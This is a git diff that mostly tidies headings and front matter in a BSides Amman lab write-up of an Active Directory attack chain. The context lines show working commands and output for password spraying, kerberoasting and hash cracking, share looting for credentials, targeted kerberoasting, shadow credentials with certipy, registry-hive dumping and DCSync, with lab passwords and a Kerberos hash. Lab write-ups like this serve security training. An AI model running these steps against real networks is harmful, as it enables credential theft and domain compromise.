@@ -1,11 +1,15 @@
 ---
-layout: "page"
 date: 2025-05-26
-author: "Zavier Lee & Saif 'Sawyer' Yaseen"
-author_avatar: "./assets/img/authors/zavier.png"
-author_title: "Offensive Security Engineer"
-author_twitter: "https://x.com/gatariee"
-author_github: "https://github.com/gatariee"
+authors:
+  - name: "Zavier Lee"
+    avatar: "./assets/img/authors/zavier.png"
+    title: "Offensive Security Engineer"
+    twitter: "https://x.com/gatariee"
+    github: "https://github.com/gatariee"
+  - name: "Saif 'Sawyer' Yaseen"
+    title: "PT Intern"
+    avatar: "./assets/img/authors/sawyer.png"
+    github: "https://github.com/sawyerspresent"
 ---
 
 
@@ -20,46 +24,46 @@ This is a writeup of the PT Village that we organized during the [BSidesAmman Co
 <li>
 <a href="#introduction">Introduction</a>
 <ul>
-<li><a href="#disclaimer-and-scenario">disclaimer and scenario</a></li>
-<li><a href="#required-tools">required tools</a></li>
+<li><a href="#disclaimer-and-scenario">Disclaimer and scenario</a></li>
+<li><a href="#required-tools">Required tools</a></li>
 </ul>
 </li>
 
 <li>
 <a href="#initial-access">Initial access</a>
 <ul>
-<li><a href="#credential-discovery">credential discovery</a></li>
+<li><a href="#credential-discovery">Credential discovery through password spraying</a></li>
 </ul>
 </li>
 
 <li>
 <a href="#accessing-svc_web">Accessing svc_web</a>
 <ul>
-<li><a href="#smb-share-enumeration">smb share enumeration</a></li>
+<li><a href="#smb-share-enumeration">SMB share enumeration</a></li>
 </ul>
 </li>
 
 <li>
-<a href="#authenticating-as-abdullah-azooz">Authenticating as abdullah.azooz</a>
+<a href="#authentication-as-abdullah">Authentication as abdullah.azooz</a>
 <ul>
-<li><a href="#acl-enumeration-with-bloodyad">acl enumeration with bloodyAD</a></li>
+<li><a href="#bloodyad-enumeration">ACL enumeration with bloodyAD</a></li>
 </ul>
 </li>
 
 <li>
-<a href="#mustafa-options">Mustafa options</a>
+<a href="#privilege-escalation">Mustafa options</a>
 <ul>
-<li><a href="#targetted-kerberoasting">targetted kerberoasting</a></li>
-<li><a href="#shadow-credentials-attack">shadow credentials attack</a></li>
-<li><a href="#group-enumeration">group enumeration</a></li>
+<li><a href="#targeted-kerberoasting">Gargeted kerberoasting</a></li>
+<li><a href="#shadow-credentials-attack">Ghadow credentials attack</a></li>
+<li><a href="#group-enumeration">Group enumeration through BloodyAD</a></li>
 </ul>
 </li>
 
 <li>
-<a href="#dcsync">DCSync</a>
+<a href="#retrieving-domain-admin-hashes-through-dcsync">DCSync</a>
 <ul>
-<li><a href="#transferring-the-files">transferring the files</a></li>
-<li><a href="#dcsync-with-machine-account">dcsync with machine account</a></li>
+<li><a href="#transfering-the-files-over">Transferring the files</a></li>
+<li><a href="#dcsync-through-machine-account">DCSync using the machine account</a></li>
 </ul>
 </li>
 </ol>
@@ -84,8 +88,7 @@ ILoveJordan123@
   
 #### Updated Scenario  
   
-In this version the initial access is done by password spraying, the users are given the necessary IPs and the user given a hint if no progress has been made in 5 minutes.  
-the hint being "Everything you need is provided to you, the username and the IPs" so we will be moving forward with the credentials updated scenario credentials `hasan.bakri:hasan.bakri`  
+In this version the initial access is done by password spraying, the users are given the necessary IPs and the user given a hint if no progress has been made in 5 minutes. The hint being "Everything you need is provided to you, the username and the IPs. Go back to the basics of Active Directory attacks and enumerations" so we will be moving forward with the credentials updated scenario `hasan.bakri:hasan.bakri`  
   
 ```  
 nxc smb 10.2.10.11 -u 'hasan.bakri' -p 'hasan.bakri'  
@@ -138,7 +141,7 @@ nxc ldap DC01.albalad.bsides.rv LDAP        10.2.10.11      389    DC01         
 
 checking the shares on these machines, we identify a `svc_home$`.  
   
-```
+```python
 nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --shares
 SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False) 
 SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False) 
@@ -163,7 +166,9 @@ SMB         10.2.10.11      445    DC01             SYSVOL          READ        
   
 we can infer that the `svc_home$` share would belongs to service accounts.  
 
-## Gaining Access to SVC_WEB
+<br>
+
+## Accessing SVC_WEB
 
 next, we can identify users with a service principal name (SPN) using the following command. users with an SPN can have their service tickets requested, and cracked offline (known as a `kerberoasting` attack.)  
   
@@ -179,7 +184,7 @@ VDI/vdi.albalad.bsides.rv:41440        svc_vdi  CN=Service Accounts,CN=Users,DC=
 TERMSRV/vdi.albalad.bsides.rv:3389     svc_vdi  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:09.803337  <never> 
 ```  
   
-we see that it is slightly odd that none of the service accounts have logged on, but it could be alright if they are only ran as services. all of the users can be kerberoasted, but we will only focus on `svc_web` for now.  
+We see that it is slightly odd that none of the service accounts have logged on, but it could be alright if they are only ran as services. all of the users can be kerberoasted, but we will only focus on `svc_web` for now.  
   
 ```shell  
 GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri' -request-user 'svc_web' -outputfile 'svc_web.tgs'
@@ -189,7 +194,7 @@ HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=alb
 HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>  
 ```  
   
-this ticket can be cracked offline with `john`, or `hashcat`.  
+This ticket can be cracked offline with `john`, or `hashcat`.  
   
 ```shell  
 john --wordlist=/usr/share/wordlists/rockyou.txt svc_web.tgs 
@@ -201,7 +206,7 @@ Session completed.
 
 ### SMB Share Enumeration
 
-using the `svc_web` account, we can enumerate the shares again and find that we now have access to `svc_home$`.  
+Using the `svc_web` account, we can enumerate the shares again and find that we now have access to `svc_home$`.  
   
 ```shell  
 nxc smb DEV03.albalad.bsides.rv -u 'svc_web' -p 'webkinz1' --shares
@@ -216,7 +221,7 @@ SMB         10.2.10.12      445    DEV03            IPC$            READ        
 SMB         10.2.10.12      445    DEV03            svc_home$       READ,WRITE      common directory for service accounts
 ```  
   
-we can begin looting this share, and find credentials in `\\svc_home$\svc_home$\svc_web\config.php`  
+We can begin looting this share, and find credentials in `\\svc_home$\svc_home$\svc_web\config.php`  
   
 ```  
 <?php  
@@ -227,9 +232,12 @@ define('DB_NAME', 'web_db');
 ?>  
 ```  
 
+<br>
 
-## Authenticating as Abdullah.Azooz
-we find that these credentials are valid for the domain.  
+
+
+## Authentication as Abdullah
+We find that these credentials are valid for the domain.  
   
 ```shell  
 nxc smb dc01.albalad.bsides.rv -u 'abdullah.azooz' -p 'PetraEnjoyer1950'
@@ -238,7 +246,7 @@ SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\abdull
 ```  
   
 ### BloodyAD Enumeration
-We can see that this user has an outbound ACL to mustafa.yaseen  
+Then we can see that this user has an outbound ACL to mustafa.yaseen  
   
 ```shell  
 bloodyAD --host 10.2.10.11 -d albalad.bsides.rv -u 'abdullah.azooz'  -p 'PetraEnjoyer1950' get writable  
@@ -247,16 +255,17 @@ distinguishedName: CN=mustafa.yaseen,CN=Users,DC=albalad,DC=bsides,DC=rvpermissi
 distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=albalad,DC=bsides,DC=rvpermission: WRITE
 ```  
 
+<br>
 
-## Two Options On Mustafa.Yaseen
-so we there are multiple attacks vectors since we have genericwrite on a user. them being;   
+## Privilege Escalation
+So we there are multiple attacks vectors since we have genericwrite on a user. them being;   
   
 - Targeted Kerberoasting  
 - ShadowCredentials  
   
 
-### Targetted Kerberoasting
-The first option here would be to use targetted kerberoasting. this abuse can be carried out if we have one of the following ACLs over a target, `GenericWrite`, `WriteProperty`. we can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.  
+### Targeted Kerberoasting
+The first option here would be to use targeted kerberoasting. this abuse can be carried out if we have one of the following ACLs over a target, `GenericWrite`, `WriteProperty`. we can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.  
   
 
 ```shell  
@@ -265,14 +274,14 @@ targetedKerberoast.py -d albalad.bsides.rv -u abdullah.azooz  -p 'PetraEnjoyer19
 [+] Writing hash to file for (mustafa.yaseen)  
 ```  
   
-now we have accomplished the attack and   
+Now we have accomplished the attack lets look at the hash
   
 ```python  
 cat mustafa.txt  
 $krb5tgs$23$*mustafa.yaseen$ALBALAD.BSIDES.RV$albalad.bsides.rv/mustafa.yaseen*$d3f68ab888e41429dd9c0a33721caa7e$e069b57e798b66b4c291d5dd9e98cf3e1909b05636450b841eaaa5fb51a8255dc8415118938f4e78424c5d406a60636fa6e7efbdb45b68928b6f53848a4a9530a3e335be2b53d4037b6cdc7e4672d12189cc3ddced2c449a8dcaccb6b8e6d4a4ea2bbb22c082dec9cdc478e0a38ce2f56610cbef7a610f5680c56368fe4140892f27d647eb966cc4b4417cc2bd3efd798e63b2a804bea66609d867668c647d769b97b6158ae8e2e51a659dd2f607b7ca0fc163eca129a34e93f9632bd4861763bc6f6a86dc4f2e44e829acc52ae5583fd90a34f74c07371dbbf3b5445c0a8e3db295b342a36638de367427a8df8f324a73b3a04dbb46b725ac87f84b94acb976ad5e1237c8ed56598a6fc5ba9b89957c75ecea7b5893a7a57438e965b594a1fcbd96910319c1e5fdf0492860141d59151d7ee937a08ecdb12e5c2046832de34c0143167184105212a2e1a02f3539686d9bbb193b1d5da10787070b20cb968c9075321ff02c4a76f184330a0fe98c7b2d9d37509164ed70000f9921313a36bd139f5b660647fada22dd0638ee30176f5067d1242b51bc106daac55ea6139ada5c20a2d06d828596e6403328472a728230b6c73f4bb31a11bd01d2c8df3774c1388c5d6edb47b6412cd46c1af8c30814db73ece3ddeaab5bc47c3ab445bcfb637488e45c11b71bd391537dd2f8b156a7949c3b9a4f5dee7d11b9759c53797fbcaafd67bf4f62f6363c9f52a1cce72cb5df2b43a2755a7e4ff8ef0a78a1dc356dd2c95b35a38890dcaca550bb579a63921d1d0558c5faece1622a0b64cc11522b32a195e6322db86fc1922648db92c1d8d19b66a1bdcf29cd7d75bfb8592e4a502ccafd9e075b37f5dec34ba2400cbb9a0bc583bcdeca81fbcb5f382666ea77bb2e7bbf046254b430213a6a82cb091ee2231aab8d6e454213cf35bbfb4617e7c4c46b089745b1f9812d67beb1883fa132808893c2a0af9774e0ff8e587a7dc26277e37c79660986f39ed700681541b9ff20c13adc970e07e64765fd86e12e80f17e8fbbbd994bc2b8c1801eb3fb01d83066ef1df30b0788d434cb409ddc92031c45fa0aee003ba063f30ff39dee66648a3e048324eb8f22571ceaac3fbe6ffe8b90869f107be104e214a6ccebd0d3a066c5d1d8ecfc883a673a8dbdcea3cfad2d4e8f1ba81265dea4b1ca153e76ade509230977d35a01e6658b7f673290085b180125d3b618b9dce7bb3ddc5c9b00723dee7f36e23c652931915a4fd6a3d073adf994cabc53a4af8d982abc5b1af3f444c5d89c67019735a3d9ae7114a6d4d621a5c739733763f76f30ad0018cf90cd82e04dc497c1221d7380b2596b4719a5a6a4070ac0c5104f08528a8abaf98c172f476bcefd9c6315189febff41d542e144ccd308fef982803ef87e9a7021d8bd7316a9d8dd6ed3e641f4c3b56669aac8e6a6215881a14e9bd6956420be03c352d6fcc2848f79d87e752e9450eeea00eac37d3350c126194df2a344ad8209af334e116fafc5040aeb4e0f0dff4119f8c3d54a50fa52f38c55c071  
 ```  
 
-attempting to crack it will lead us to cracking the password!  
+Attempting to crack it will lead us to cracking the password!
   
 ```python  
 john -w=/usr/share/wordlists/rockyou.txt mustafa.txt  
@@ -292,7 +301,6 @@ Session completed.
 Its not out of the norm for targetedkerberoasting not work too, since some users might have very strong & complex passwords. Hence we will move towards shadow credentials incase the password doesn't crack  
   
 Active Directory user and computer objects include an `msDS-KeyCredentialLink` attribute where public keys can be stored, when enabling PKINIT pre-authentication the KDC validates that a user possesses the corresponding private key before issuing a TGT. If an attacker gains permissions to modify another object’s `msDS-KeyCredentialLink`—for example, via group membership or elevated ACEs—they can inject their own public key and thereafter authenticate as that account, granting them persistent, stealthy access to the target.  
-  
   
 ```shell  
 kali@kali ~> certipy shadow auto -u abdullah.azooz@albalad.bsides.rv -p 'PetraEnjoyer1950' -account mustafa.yaseenCertipy v4.8.2 - by Oliver Lyak (ly4k)  
@@ -325,7 +333,9 @@ distinguishedName: CN=Users,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-
 distinguishedName: CN=Backup Operators,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-32-551sAMAccountName: Backup Operators  
 distinguishedName: CN=Domain Users,CN=Users,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-21-3705552387-1610714051-5520856-513sAMAccountName: Domain Users
 ```  
-  
+<br>
+
+
 ## Retrieving Domain Admin hashes through DCSync 
 ### Transfering the files over
 To minimize our footprint we are going to dump the SAM, SYSTEM & SECURITY on our attack box by first setting up an SMB Server
@@ -372,8 +382,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Cleaning up...   
 ``` 
 
-To no avail we dont get the Domain administrator hashes, Now we move on to dumping the SYSTEM
-  
+Despite our efforts, the Domain Administrator hashes could not be obtained from here. The next step will be attempting to dump the SYSTEM registry hive  
 
 ```python  
 secretsdump.py -system SYSTEM.save -security SECURITY.save LOCAL  
@@ -395,7 +404,7 @@ dpapi_userkey:0xa3cf76ada7b5a47872bc8c3b2fe8c660f9254c89
 ```  
   
 ### DCSync through machine account
-Through Dumping the SYSTEM we can use the DC account to perform DCSync!, This is because the machine account always has permissions to DCSync itself
+Through Dumping the SYSTEM we can use the DC account to perform DCSync!
   
   
 ```shell  
